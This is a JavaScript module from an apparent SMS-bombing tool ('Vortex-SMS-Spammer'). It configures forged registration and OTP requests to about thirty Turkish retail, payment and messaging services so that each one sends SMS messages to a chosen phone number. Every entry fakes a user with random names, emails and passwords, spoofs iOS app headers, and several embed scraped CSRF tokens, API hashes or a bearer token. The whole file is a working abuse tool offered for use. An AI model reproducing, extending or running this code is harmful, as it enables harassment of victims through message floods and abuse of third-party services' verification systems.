/**
 * VortexSMS - Retail Services
 * 
 * Copyright (c) 2025-present XeldarAlz
 * 
 * This program is free software: you can redistribute it and/or modify
 * it under the terms of the GNU Affero General Public License as published
 * by the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 * 
 * Original Repository: https://github.com/XeldarAlz/Vortex-SMS-Spammer
 * 
 * NOTICE: Removing this notice or claiming this work as your own
 * is a violation of the license and may result in legal action.
 */

const { faker, randomPassword, randomFullName, randomFirstName, randomLastName, randomGender, randomBirthDate, randomDeviceId, randomDeviceInfo } = require('../helpers');
const ServiceBuilder = require('../service-builder');

const retailServices = [
    // Kigili
    ServiceBuilder.form('Kigili',
        'https://www.kigili.com/users/registration/',
        (phone) => ({
            first_name: randomFirstName(),
            last_name: randomLastName(),
            email: faker.internet.email(),
            phone: '0' + phone,
            password: randomPassword(),
            confirm: 'true',
            kvkk: 'true',
            next: ''
        }),
        { successCodes: [202] }
    ),

    // WMF
    ServiceBuilder.form('WMF',
        'https://www.wmf.com.tr/users/register/',
        (phone) => ({
            confirm: 'true',
            date_of_birth: randomBirthDate('iso'),
            email: faker.internet.email(),
            email_allowed: 'true',
            first_name: randomFirstName(),
            gender: randomGender(),
            last_name: randomLastName(),
            password: randomPassword(),
            phone: '0' + phone
        }),
        { successCodes: [202] }
    ),

    // Bim
    ServiceBuilder.simple('Bim',
        'https://bim.veesk.net:443/service/v1.0/account/login',
        'phone'
    ),

    // Sok
    ServiceBuilder.jsonApi('Sok',
        'https://api.ceptesok.com:443/api/users/sendsms',
        (phone) => ({
            mobile_number: phone,
            token_type: 'register_token'
        })
    ),

    // Migros (Login endpoint)
    ServiceBuilder.jsonApi('Migros',
        'https://rest.migros.com.tr:443/sanalmarket/users/login/otp',
        (phone) => ({ phoneNumber: phone })
    ),

    // Migros (Registration endpoint)
    new ServiceBuilder('MigrosRegister')
        .url('https://rest.migros.com.tr:443/sanalmarket/users/register/otp')
        .headers({
            'User-Agent': (() => {
                const deviceInfo = randomDeviceInfo();
                return `Migros/1917 CFNetwork/1335.0.3.4 Darwin/21.6.0`;
            })(),
            'X-Device-Model': (() => randomDeviceInfo()['X-Device-Model'])(),
            'X-Device-Type': 'MOBILE',
            'X-Device-App-Screen': 'OTHER',
            'X-Device-Language': 'tr-TR',
            'X-Device-App-Version': '10.6.13',
            'X-Device-Current-Long': '',
            'X-Request-Identifier': randomDeviceId(),
            'X-Device-Selected-Address-Lat': '',
            'X-Device-Platform-Version': (() => randomDeviceInfo()['X-Device-Platform-Version'])(),
            'X-Device-Current-Lat': '',
            'X-Device-Platform': 'IOS',
            'X-Store-Ids': '',
            'X-Device-Longitude': '',
            'Accept-Language': 'tr-TR,tr;q=0.9',
            Accept: '*/*',
            'Content-Type': 'application/json',
            'X-Device-Latitude': '',
            'Accept-Encoding': 'gzip, deflate, br',
            'X-Device-Selected-Address-Long': '',
            'X-Device-Identifier': randomDeviceId()
        })
        .json((phone) => ({
            email: faker.internet.email(),
            phoneNumber: phone
        }))
        .timeout(6000)
        .build(),

    // A101
    ServiceBuilder.jsonApi('A101',
        'https://www.a101.com.tr:443/users/otp-login/',
        (phone) => ({
            phone: '0' + phone,
            next: '/a101-kapida'
        })
    ),

    // NaosStars
    ServiceBuilder.jsonApi('NaosStars',
        'https://shop.naosstars.com/users/register/',
        (phone) => ({
            email: faker.internet.email(),
            first_name: randomFirstName(),
            last_name: randomLastName(),
            password: randomPassword(),
            date_of_birth: randomBirthDate('iso'),
            phone: `0${phone}`,
            gender: randomGender(),
            kvkk: 'true',
            contact: 'true',
            confirm: 'true'
        }),
        { successCodes: [200, 201, 202, 204, 205] }
    ),

    // NaosStarsAPI
    new ServiceBuilder('NaosStarsAPI')
        .url('https://api.naosstars.com:443/api/smsSend/9c9fa861-cc5d-43b0-b4ea-1b541be15350')
        .headers({
            Uniqid: '9c9fa861-cc5d-43c0-b4ea-1b541be15351',
            'User-Agent': 'naosstars/1.0030 CFNetwork/1335.0.3.2 Darwin/21.6.0',
            'Access-Control-Allow-Origin': '*',
            Locale: 'en-TR',
            Version: '1.0030',
            Os: 'ios',
            Apiurl: 'https://api.naosstars.com/api/',
            'Device-Id': randomDeviceId(),
            Platform: 'ios',
            'Accept-Language': 'en-US,en;q=0.9',
            Timezone: 'Europe/Istanbul',
            Globaluuidv4: randomDeviceId(),
            Timezoneoffset: '-180',
            Accept: 'application/json',
            'Content-Type': 'application/json; charset=utf-8',
            'Accept-Encoding': 'gzip, deflate',
            Apitype: 'mobile_app'
        })
        .json((phone) => ({
            telephone: '+90' + phone,
            type: 'register'
        }))
        .timeout(6000)
        .build(),

    // Evidea
    new ServiceBuilder('Evidea')
        .url('https://www.evidea.com:443/users/register/')
        .headers({
            'Content-Type': 'multipart/form-data; boundary=fDlwSzkZU9DW5MctIxOi4EIsYB9LKMR1zyb5dOuiJpjpQoK1VPjSyqdxHfqPdm3iHaKczi',
            'X-Project-Name': 'undefined',
            Accept: 'application/json, text/plain, */*',
            'X-App-Type': 'akinon-mobile',
            'X-Requested-With': 'XMLHttpRequest',
            'Accept-Language': 'tr-TR,tr;q=0.9',
            'Cache-Control': 'no-store',
            'Accept-Encoding': 'gzip, deflate',
            'X-App-Device': 'ios',
            Referer: 'https://www.evidea.com/',
            'User-Agent': 'Evidea/1 CFNetwork/1335.0.3 Darwin/21.6.0',
            'X-Csrftoken': '7NdJbWSYnOdm70YVLIyzmylZwWbqLFbtsrcCQdLAEbnx7a5Tq4njjS3gEElZxYps'
        })
        .data((phone) => {
            const firstName = randomFirstName();
            const lastName = randomLastName();
            return `--fDlwSzkZU9DW5MctIxOi4EIsYB9LKMR1zyb5dOuiJpjpQoK1VPjSyqdxHfqPdm3iHaKczi\r\ncontent-disposition: form-data; name="first_name"\r\n\r\n${firstName}\r\n--fDlwSzkZU9DW5MctIxOi4EIsYB9LKMR1zyb5dOuiJpjpQoK1VPjSyqdxHfqPdm3iHaKczi\r\ncontent-disposition: form-data; name="last_name"\r\n\r\n${lastName}\r\n--fDlwSzkZU9DW5MctIxOi4EIsYB9LKMR1zyb5dOuiJpjpQoK1VPjSyqdxHfqPdm3iHaKczi\r\ncontent-disposition: form-data; name="email"\r\n\r\n${faker.internet.email()}\r\n--fDlwSzkZU9DW5MctIxOi4EIsYB9LKMR1zyb5dOuiJpjpQoK1VPjSyqdxHfqPdm3iHaKczi\r\ncontent-disposition: form-data; name="email_allowed"\r\n\r\nfalse\r\n--fDlwSzkZU9DW5MctIxOi4EIsYB9LKMR1zyb5dOuiJpjpQoK1VPjSyqdxHfqPdm3iHaKczi\r\ncontent-disposition: form-data; name="sms_allowed"\r\n\r\ntrue\r\n--fDlwSzkZU9DW5MctIxOi4EIsYB9LKMR1zyb5dOuiJpjpQoK1VPjSyqdxHfqPdm3iHaKczi\r\ncontent-disposition: form-data; name="password"\r\n\r\n${randomPassword()}\r\n--fDlwSzkZU9DW5MctIxOi4EIsYB9LKMR1zyb5dOuiJpjpQoK1VPjSyqdxHfqPdm3iHaKczi\r\ncontent-disposition: form-data; name="phone"\r\n\r\n0${phone}\r\n--fDlwSzkZU9DW5MctIxOi4EIsYB9LKMR1zyb5dOuiJpjpQoK1VPjSyqdxHfqPdm3iHaKczi\r\ncontent-disposition: form-data; name="confirm"\r\n\r\ntrue\r\n--fDlwSzkZU9DW5MctIxOi4EIsYB9LKMR1zyb5dOuiJpjpQoK1VPjSyqdxHfqPdm3iHaKczi--\r\n`;
        })
        .timeout(6000)
        .successCodes([200, 201, 202, 204, 205])
        .build(),

    // Koton
    new ServiceBuilder('Koton')
        .url('https://www.koton.com:443/users/register/')
        .headers({
            'Content-Type': 'multipart/form-data; boundary=sCv.9kRG73vio8N7iLrbpV44ULO8G2i.WSaA4mDZYEJFhSER.LodSGKMFSaEQNr65gHXhk',
            'X-Project-Name': 'rn-env',
            Accept: 'application/json, text/plain, */*',
            'X-App-Type': 'akinon-mobile',
            'X-Requested-With': 'XMLHttpRequest',
            'Accept-Language': 'en-US,en;q=0.9',
            'Cache-Control': 'no-store',
            'Accept-Encoding': 'gzip, deflate',
            'X-App-Device': 'ios',
            Referer: 'https://www.koton.com/',
            'User-Agent': 'Koton/1 CFNetwork/1335.0.3.2 Darwin/21.6.0',
            'X-Csrftoken': '5DDwCmziQhjSP9iGhYE956HHw7wGbEhk5kef26XMFwhELJAWeaPK3A3vufxzuWcz'
        })
        .data((phone) => {
            const firstName = randomFirstName();
            const lastName = randomLastName();
            const dob = randomBirthDate('iso');
            return `--sCv.9kRG73vio8N7iLrbpV44ULO8G2i.WSaA4mDZYEJFhSER.LodSGKMFSaEQNr65gHXhk\r\ncontent-disposition: form-data; name="first_name"\r\n\r\n${firstName}\r\n--sCv.9kRG73vio8N7iLrbpV44ULO8G2i.WSaA4mDZYEJFhSER.LodSGKMFSaEQNr65gHXhk\r\ncontent-disposition: form-data; name="last_name"\r\n\r\n${lastName}\r\n--sCv.9kRG73vio8N7iLrbpV44ULO8G2i.WSaA4mDZYEJFhSER.LodSGKMFSaEQNr65gHXhk\r\ncontent-disposition: form-data; name="email"\r\n\r\n${faker.internet.email()}\r\n--sCv.9kRG73vio8N7iLrbpV44ULO8G2i.WSaA4mDZYEJFhSER.LodSGKMFSaEQNr65gHXhk\r\ncontent-disposition: form-data; name="password"\r\n\r\n${randomPassword()}\r\n--sCv.9kRG73vio8N7iLrbpV44ULO8G2i.WSaA4mDZYEJFhSER.LodSGKMFSaEQNr65gHXhk\r\ncontent-disposition: form-data; name="phone"\r\n\r\n0${phone}\r\n--sCv.9kRG73vio8N7iLrbpV44ULO8G2i.WSaA4mDZYEJFhSER.LodSGKMFSaEQNr65gHXhk\r\ncontent-disposition: form-data; name="confirm"\r\n\r\ntrue\r\n--sCv.9kRG73vio8N7iLrbpV44ULO8G2i.WSaA4mDZYEJFhSER.LodSGKMFSaEQNr65gHXhk\r\ncontent-disposition: form-data; name="sms_allowed"\r\n\r\ntrue\r\n--sCv.9kRG73vio8N7iLrbpV44ULO8G2i.WSaA4mDZYEJFhSER.LodSGKMFSaEQNr65gHXhk\r\ncontent-disposition: form-data; name="email_allowed"\r\n\r\ntrue\r\n--sCv.9kRG73vio8N7iLrbpV44ULO8G2i.WSaA4mDZYEJFhSER.LodSGKMFSaEQNr65gHXhk\r\ncontent-disposition: form-data; name="date_of_birth"\r\n\r\n${dob}\r\n--sCv.9kRG73vio8N7iLrbpV44ULO8G2i.WSaA4mDZYEJFhSER.LodSGKMFSaEQNr65gHXhk\r\ncontent-disposition: form-data; name="call_allowed"\r\n\r\ntrue\r\n--sCv.9kRG73vio8N7iLrbpV44ULO8G2i.WSaA4mDZYEJFhSER.LodSGKMFSaEQNr65gHXhk\r\ncontent-disposition: form-data; name="gender"\r\n\r\n\r\n--sCv.9kRG73vio8N7iLrbpV44ULO8G2i.WSaA4mDZYEJFhSER.LodSGKMFSaEQNr65gHXhk--\r\n`;
        })
        .successCodes([200, 201, 202, 204, 205])
        .build(),

    // Metro
    new ServiceBuilder('Metro')
        .url('https://mobile.metro-tr.com:443/api/mobileAuth/validateSmsSend')
        .headers({
            Accept: '*/*',
            'Content-Type': 'application/json; charset=utf-8',
            'Accept-Encoding': 'gzip, deflate, br',
            Applicationversion: '2.4.1',
            Applicationplatform: '2',
            'User-Agent': (() => {
                const deviceInfo = randomDeviceInfo();
                return `Metro Turkiye/2.4.1 (com.mcctr.mobileapplication; build:4; iOS ${deviceInfo.version}) Alamofire/4.9.1`;
            })(),
            'Accept-Language': 'en-BA;q=1.0, tr-BA;q=0.9, bs-BA;q=0.8',
            Connection: 'keep-alive'
        })
        .json((phone) => ({
            methodType: '2',
            mobilePhoneNumber: phone
        }))
        .build(),

    // ToptanTeslim
    new ServiceBuilder('ToptanTeslim')
        .url('https://toptanteslim.com:443/Services/V2/MobilServis.aspx')
        .headers({
            'Content-Type': 'application/x-www-form-urlencoded',
            Accept: 'application/json',
            Mode: 'no-cors',
            U: 'e-ticaret',
            'User-Agent': 'eTicDev/1 CFNetwork/1335.0.3.4 Darwin/21.6.0',
            'Accept-Language': 'tr-TR,tr;q=0.9',
            'Accept-Encoding': 'gzip, deflate, br'
        })
        .json((phone) => {
            const firstName = randomFirstName();
            const lastName = randomLastName();
            return {
                ADRES: 'ZXNlZGtm',
                DIL: 'tr_TR',
                EPOSTA: faker.internet.email(),
                EPOSTA_BILDIRIM: true,
                ILCE: 'BA\xc5\x9eAK\xc5\x9eEH\xc4\xb0R',
                ISLEM: 'KayitOl',
                ISTEMCI: 'BEABC9B2-A58F-3131-AF46-2FF404F79677',
                KIMLIKNO: null,
                KULLANICI_ADI: firstName,
                KULLANICI_SOYADI: lastName,
                PARA_BIRIMI: 'TL',
                PAROLA: randomPassword(),
                POSTAKODU: String(100000 + Math.floor(Math.random() * 899999)),
                SEHIR: '\xc4\xb0STANBUL',
                SEMT: 'BA\xc5\x9eAK\xc5\x9eEH\xc4\xb0R MAH.',
                SMS_BILDIRIM: true,
                TELEFON: phone,
                TICARI_UNVAN: firstName,
                ULKE_ID: 1105,
                VERGI_DAIRESI: 'Istanbul',
                VERGI_NU: ''
            };
        })
        .timeout(6000)
        .build(),

    // N11
    new ServiceBuilder('N11')
        .url('https://mobileapi.n11.com:443/mobileapi/rest/v2/msisdn-verification/init-verification?__hapc=F41A0C01-D102-4DBE-97B2-07BCE2317CD3')
        .headers({
            Mobileclient: 'IOS',
            'Content-Type': 'application/json',
            Accept: '*/*',
            Authorization: 'api_key=iphone,api_hash=9f55d44e2aa28322cf84b5816bb20461,api_random=686A1491-041F-4138-865F-9E76BC60367F',
            Clientversion: '163',
            'Accept-Encoding': 'gzip, deflate',
            'User-Agent': 'n11/1 CFNetwork/1335.0.3 Darwin/21.6.0',
            'Accept-Language': 'tr-TR,tr;q=0.9'
        })
        .json((phone) => ({
            __hapc: '',
            _deviceId: '696B171-031N-4131-315F-9A76BF60368F',
            channel: 'MOBILE_IOS',
            countryCode: '+90',
            email: faker.internet.email(),
            gsmNumber: phone,
            userType: 'BUYER'
        }))
        .build(),

    // EnglishHome
    ServiceBuilder.web('EnglishHome',
        'https://www.englishhome.com:443/api/member/sendOtp',
        'https://www.englishhome.com',
        (phone) => ({
            Phone: phone,
            XID: ''
        })
    ),

    // Macrocenter
    new ServiceBuilder('Macrocenter')
        .url('https://rest.macrocenter.com.tr:443/users/login/otp')
        .headers({
            'Content-Type': 'application/json',
            'X-Device-Platform': 'IOS',
            'X-Request-Identifier': '2C1B6BBB-3E1E-4E7E-9CAE-990C6EAAD279',
            Accept: '*/*',
            'X-Device-Model': (() => randomDeviceInfo()['X-Device-Model'])(),
            'X-Store-Ids': '',
            'X-Device-Version': '2.3.7',
            'Accept-Language': 'en-US,en;q=0.9',
            'Accept-Encoding': 'gzip, deflate',
            'X-Device-Platform-Version': (() => randomDeviceInfo()['X-Device-Platform-Version'])(),
            'User-Agent': 'Macrocenter/15 CFNetwork/1335.0.3.2 Darwin/21.6.0',
            'X-Device-Identifier': 'C7CF9525-9BEB-47B0-87EF-FAFA9F778C3E',
            'X-Device-Type': 'MOBILE'
        })
        .json((phone) => ({ phoneNumber: phone }))
        .build(),

    // Unilever
    ServiceBuilder.form('Unilever',
        'https://www.siparisdirekt.com/customer/otp/sendotp',
        (phone) => ({
            mobile: phone,
            prefix: '+90'
        })
    ),

    // Uysal
    ServiceBuilder.jsonApi('Uysal',
        'https://api.uysalmarket.com.tr/api/mobile-users/send-register-sms',
        (phone) => ({ phone_number: phone })
    ),

    // Alixavien
    ServiceBuilder.web('Alixavien',
        'https://www.alixavien.com.tr:443/api/member/sendOtp',
        'https://www.alixavien.com.tr',
        (phone) => ({
            Phone: phone,
            XID: ''
        }),
        { timeout: 6000, referer: 'https://www.alixavien.com.tr/UyeOl' }
    ),

    // Jimmykey
    new ServiceBuilder('Jimmykey')
        .url((phone) => `https://www.jimmykey.com:443/tr/p/User/SendConfirmationSms?gsm=${phone}&gRecaptchaResponse=undefined`)
        .timeout(6000)
        .build(),

    // File
    ServiceBuilder.ios('File',
        'https://api.filemarket.com.tr:443/v1/otp/send',
        'filemarket',
        '1.7',
        (phone) => ({
            mobilePhoneNumber: '90' + phone
        }),
        {
            timeout: 6000,
            cfNetwork: '1335.0.3.2',
            additionalHeaders: {
                'X-Os': 'IOS',
                'X-Version': '1.7'
            }
        }
    ),

    // Hatemoglu
    ServiceBuilder.web('Hatemoglu',
        'https://www.hatemoglu.com:443/api/member/sendOtp',
        'https://www.hatemoglu.com',
        (phone) => ({
            Phone: phone,
            XID: ''
        }),
        { timeout: 6000 }
    ),

    // Dagi
    ServiceBuilder.web('Dagi',
        'https://www.dagi.com.tr:443/api/member/sendOtp',
        'https://www.dagi.com.tr',
        (phone) => ({
            Phone: phone,
            XID: ''
        }),
        { timeout: 6000 }
    ),

    // Kip
    ServiceBuilder.web('Kip',
        'https://www.kip.com.tr:443/api/member/sendOtp',
        'https://www.kip.com.tr',
        (phone) => ({
            Phone: phone,
            XID: ''
        }),
        { timeout: 6000 }
    ),

    // Ramsey
    ServiceBuilder.web('Ramsey',
        'https://www.ramsey.com.tr:443/api/member/sendOtp',
        'https://www.ramsey.com.tr',
        (phone) => ({
            Phone: phone,
            XID: ''
        }),
        { timeout: 6000 }
    ),

    // ICQ
    new ServiceBuilder('ICQ')
        .url((phone) => `https://u.icq.net:443/api/v90/smsreg/requestPhoneValidation.php?client=icq&f=json&k=gu19PNBblQjCdbMU&locale=en&msisdn=%2B90${phone}&platform=ios&r=796356153&smsFormatType=human`)
        .headers({
            Accept: '*/*',
            'Content-Type': 'application/x-www-form-urlencoded',
            'User-Agent': 'ICQ iOS #no_user_id# gu19PNBblQjCdbMU 23.1.1(124106) 15.7.7 iPhone9,4',
            'Accept-Language': 'en-US,en;q=0.9',
            'Accept-Encoding': 'gzip, deflate'
        })
        .timeout(6000)
        .build(),

    // Qumpara
    new ServiceBuilder('Qumpara')
        .url('https://tr-api.fisicek.com:443/v1.3/auth/getOTP')
        .headers({
            Accept: 'application/json',
            'Content-Type': 'application/json',
            'Accept-Encoding': 'gzip, deflate',
            'User-Agent': (() => {
                const deviceInfo = randomDeviceInfo();
                return `qumpara/4.2.53 (iPhone; iOS ${deviceInfo.version}; Scale/3.00)`;
            })(),
            'Accept-Language': 'en-TR;q=1, tr-TR;q=0.9'
        })
        .json((phone) => ({
            msisdn: '+90' + phone
        }))
        .timeout(6000)
        .build(),

    // Paybol
    new ServiceBuilder('Paybol')
        .url('https://pyb-mobileapi.walletgate.io:443/v1/Account/RegisterPersonalAccountSendOtpSms')
        .headers({
            Accept: 'application/json',
            'Content-Type': 'application/json',
            'User-Agent': (() => {
                const deviceInfo = randomDeviceInfo();
                return `Paybol/1.2.1 (com.app.paybol; build:1; iOS ${deviceInfo.version}) Alamofire/5.5.0`;
            })(),
            'Accept-Language': 'en-TR;q=1.0, tr-TR;q=0.9',
            'Accept-Encoding': 'gzip, deflate',
            Connection: 'close'
        })
        .json((phone) => ({
            phone_number: '90' + phone
        }))
        .timeout(6000)
        .build(),

    // Joker
    new ServiceBuilder('Joker')
        .url('https://api.joker.com.tr:443/api/register')
        .headers({
            Accept: '*/*',
            'Content-Type': 'application/json',
            Authorization: 'Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJpYXQiOjE2OTA3MTY1MjEsImV4cCI6MTY5NTkwMDUyMSwidXNlcm5hbWUiOiJHVUVTVDE2OTA3MTY1MjEzMzA3MzdAam9rZXIuY29tLnRyIiwiZ3Vlc3QiOnRydWV9.TaQA8ZDtmU09eFqOFATS8ubXM4BHPQL_BcgeEoqZfuNZcfjfL_xzqRO7fZehzWzEdjHXNXeCUTdjx76EyVB-b3TFuL3OahmrbeaOICD8MXchhMDv78TFhWzOJ9Ad-Mma6QPScSSVL0pYoQHWRhzaeOkmVeypqYiQKGmOEk9NzfOVxDYPa25iJmetiab1Z_b95Hqt5Cls52V7g4pGWmbjYB3gyeUQn5II6neKN174txp1yaGdrNPYwAk_aRJzoAMA1SisZm4rhjdE_9MeyGwjbgk2obPxEVcwvPPwkd56_a34aDOeo6rAvngGALBPWlS89nfHFb6PU2fKyK7jTaVlC0DiVnojlkC_KzoHcptM7SjQBym4Bn9CXZ4kj2J1Om-dhDymQynSCfmQ3JZQd7n1YdQYYMuAoTbjghZhyPu2SCtlI7ao6JhUUcmtO3fjIiyYgAdgD-FDcqSGAs9i5fn3kCidSku5M4ljq1ovJM4BeaNeQdFXqE_WqurpOeLA95fNumGCoXvJGlLhS5VzMdFT-l3cfdPt0V0WmtjJDRpTnosjgfizx4F5qftlVuF98uoFoexg7lQYHyZ-j455-d5B24_WfU8GCjQhtlDVtSTcMiRvUKEjJ-Glm5syv5VVbR7mJxu64SB2J2dPbHcIk6BQuFYXIJklN7GXxDa8mSnEZds',
            'Accept-Encoding': 'gzip, deflate',
            'User-Agent': (() => {
                const deviceInfo = randomDeviceInfo();
                return `Joker/4.0.14 (com.joker.app; build:2; iOS ${deviceInfo.version}) Alamofire/5.4.3`;
            })(),
            'Accept-Language': 'en-TR;q=1.0, tr-TR;q=0.9',
            Connection: 'close'
        })
        .json((phone) => ({
            firstName: randomFirstName(),
            gender: 'm',
            iosVersion: '4.0.2',
            lastName: randomLastName(),
            os: 'IOS',
            password: randomPassword(),
            phoneNumber: '0' + phone,
            username: faker.internet.email()
        }))
        .timeout(6000)
        .build(),

    // Macrocenter (Alternative endpoint)
    new ServiceBuilder('MacrocenterAlt')
        .url('https://www.macrocenter.com.tr:443/rest/users/register/otp?reid=31')
        .headers(ServiceBuilder.webHeaders('https://www.macrocenter.com.tr', 'https://www.macrocenter.com.tr/kayit'))
        .addHeaders({
            'X-Forwarded-Rest': 'true',
            'X-Pwa': 'true',
            'X-Device-Pwa': 'true'
        })
        .json((phone) => ({
            email: faker.internet.email(),
            phoneNumber: phone
        }))
        .timeout(6000)
        .build()
];

module.exports = retailServices;
